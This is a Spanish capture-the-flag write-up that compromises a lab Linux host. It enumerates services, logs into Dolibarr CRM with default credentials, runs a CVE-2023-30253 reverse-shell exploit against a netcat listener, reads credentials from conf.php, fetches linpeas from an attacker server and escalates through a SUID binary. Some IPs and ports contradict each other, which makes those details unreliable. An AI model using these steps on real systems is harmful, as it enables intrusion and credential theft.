***
# 1. Enumeración

Realizamos un escaneo a la máquina vulnerable para ver posibles puertos abiertos

```bash
sudo nmap -p- --open -sV -sS --min-rate 5000 -n 10.129.66.100 -oN scanPorts
```

El host responde con un TTL cerca a 64 (63), lo que quiere decir que es un sistema Linux. Hay conectividad, así que pasamos a escanear los puertos abiertos con nmap.

Identificamos dos servicios principales expuestos:

- **Puerto 22:** OpenSSH
- **Puerto 80:** Servidor web Apache

Entramos a la IP desde el navegador y vemos una web corporativa construida en PHP. Revisamos el pie de página y encontramos un formulario de contacto. Probamos a enviar datos vacíos para ver qué sucede y descubrir posibles fallos tipo LFI o SSRF, pero el parámetro `index.php?` no procesa nada relevante.

 En ese mismo pie de página aparece un correo con el dominio `board.htb`. Esto suele significar que el servidor gestiona peticiones mediante Virtual Hosting. Entonces lo agregamos a nuestro archivo `/etc/hosts` para que resuelva localmente:

```bash
echo "10.10.11.11 board.htb" | sudo tee -a /etc/hosts
```

Ahora aplicamos fuzzing con la herramienta ``ffuf`` para descubrir si existen subdominios ocultos.

```bash
sudo ffuf -u http://FUZZ.board.htb -t 200 -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

La herramienta detecta el subdominio crm, por lo que se tiene que agregar también al /etc/hosts.

# 2. Acceso Inicial (Explotación Dolibarr CRM)

Investigando vulnerabilidades públicas para Dolibarr 17.0.0, encontramos que está afectado por **CVE-2023-30253**, un fallo que permite ejecución remota de comandos (RCE) tras iniciar sesión.
Buscando las credenciales por defecto en google damos con que es admin:admin, probamos y logramos entrar.

También podemos buscar exploits para esta versión de dolibarr usando `searchsploit`

Ponemos un puerto en escucha con netcat

```bash
nc -nlvp 443
```

Ejecutamos el exploit:

```python
python3 exploit.py http://crm.board.htb admin admin 10.129.66.100 9001
```

# 3. Pivoting

Para movernos por el sistema de forma más cómoda, exploramos los archivos del propio CRM. Nos dirigimos al directorio de la app web y localizamos el archivo de conf.php (normlamente en estos archivos suelen haber credenciales).

```bash
ls -la /var/www/html/crm/htdocs/conf/
cat /var/www/html/crm/htdocs/conf/conf.php
```

Dentro encontramos una contraseña, por lo que asumimos que pertenece al usuario `larissa`

Logramos entrar y podemos ver la flag `user.txt`

# 4. Escalada de Privilegios a Root

Como `larissa` no cuenta con privilegios en sudo, realizamos un reconocimiento más profundo del sistema. Transferimos y ejecutamos el script linpeas.sh usando un servidor http en Python.

```bash
#Máquina atacante
python3 -m http.server 80

#Máquina víctima
wget 10.129.66.100/linpeas.sh

chmod +x linpeas.sh
./linpeas.sh
```

Al revisar los binarios del sistema con permisos SUID, linpeas muestra enlightenment_sys.

Buscando exploits encontramos uno que permite escalar privilegios abusando la forma en que gestiona llamadas al sistema.

Descargamos dicho exploit

```bash
chmod +x exploit.sh
./exploit.sh
```

Y ya ganamos acceso como root, por lo que podemos capturar la flag root.txt